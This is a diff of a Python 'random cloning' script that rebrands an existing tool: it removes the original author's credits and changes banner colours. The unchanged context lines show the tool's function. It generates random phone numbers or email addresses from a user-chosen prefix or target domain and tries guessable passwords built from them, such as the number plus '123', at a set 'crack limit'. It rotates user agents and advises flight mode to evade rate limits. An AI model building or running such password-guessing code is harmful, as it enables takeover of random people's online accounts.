@@ -1,6 +1,4 @@
-#Create By: MUMIT ISLAM HIMU
-#FaceBook: Mumit Islam
-#GitHub: https://github.com/MUMIT-404-CYBER
+
 #---------------------------------------------------------------------------#
 import os,sys,time,json,random,re,string,platform,base64,uuid
 from bs4 import BeautifulSoup as sop
@@ -74,20 +72,20 @@ for xd in range(10000):
     ugen.append(uaku2)
 os.system('xdg-open https://github.com/weirdnehal')
 logo = ("""
-\033[1;37md8b   db d88888b db   db  .d8b.  db      
-\033[1;37m888o  88 88'     88   88 d8' `8b 88      
-\033[1;37m88V8o 88 88ooooo 88ooo88 88ooo88 88      
-\033[1;37m88 V8o88 88~~~~~ 88~~~88 88~~~88 88      
-\033[1;37m88  V888 88.     88   88 88   88 88booo. 
-\033[1;37mVP   V8P Y88888P YP   YP YP   YP Y88888P
+\033[1;37m d8b   db d88888b db   db  .d8b.  db      
+\033[1;37m 888o  88 88'     88   88 d8' `8b 88      
+\033[1;37m 88V8o 88 88ooooo 88ooo88 88ooo88 88      
+\033[1;37m 88 V8o88 88~~~~~ 88~~~88 88~~~88 88      
+\033[1;37m 88  V888 88.     88   88 88   88 88booo. 
+\033[1;37m VP   V8P Y88888P YP   YP YP   YP Y88888P
 
- \033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ \033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  \033[1;92m[\033[1;37m✔\033[1;92m] AUTHOR    \033[1;37m: \033[1;92mNEHAL AHMED           
  \033[1;92m[\033[1;37m✔\033[1;92m] FACEBOOK  \033[1;37m: \033[1;92mnehal.ahmed6             
  \033[1;92m[\033[1;37m✔\033[1;92m] WHATSAPP  \033[1;37m: \033[1;92m+8801613016943                     
  \033[1;92m[\033[1;37m✔\033[1;92m] GITHUB    \033[1;37m: \033[1;92mweirdnehal                
  \033[1;92m[\033[1;37m✔\033[1;92m] TOOLS     \033[1;37m: \033[1;92mRANDOM CLONING                        
- \033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
+ \033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 
 
 class Main:
@@ -101,7 +99,7 @@ class Main:
         print(" [01] Random Number Clone")
         print(" [02] Random Email Clone ")
         print(" [00] Exit")
-        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        print("\033[1;37m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
         Mumit =input(" [?] Choose : ")
         os.system('xdg-open https://github.com/weirdnehal')
         if Mumit in ["1", "01"]:
@@ -117,14 +115,14 @@ def num():
     os.system('clear')
     print(logo)
     print(' [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')
-    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print("\033[1;37m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
     kode = input(' [?] Enter sim code: ')
     kodex = ''.join(random.choice(string.digits) for _ in range(2))
     kod = ''.join(random.choice(string.digits) for _ in range(2))
     os.system('clear')
     print(logo)
     print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
-    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print("\033[1;37m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
     limit = int(input(' [?] Crack Limit : '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
@@ -137,7 +135,7 @@ def num():
         print(' \033[1;97m[+] Process has been started')
         print(' \033[1;97m[!] Wait for ids ')
         print(' \033[1;97m[!] Use flight mode for speed up ')
-        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        print("\033[1;37m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
         for guru in user:
             uid = kode+kodex+kod+guru
             pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
@@ -156,12 +154,12 @@ def gml():
     os.system('clear')
     print(logo)
     print(' [+] EXAMPLE : @gmail.com, @yahoo.com ')
-    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print("\033[1;37m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
     doamin = input(' [?] Terget doamin : ')
     os.system('clear')
     print(logo)
     print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
-    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print("\033[1;37m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
     limit = int(input('[?] Crack Limit : '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
@@ -174,7 +172,7 @@ def gml():
         print(' \033[1;97m[+] Process has been started')
         print(' \033[1;97m[!] Wait for ids ')
         print(' \033[1;97m[!] Use flight mode for speed up ')
-        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        print("\033[1;37m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
         for guru in user:
             uid = kode+kodex+guru+doamin
             pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
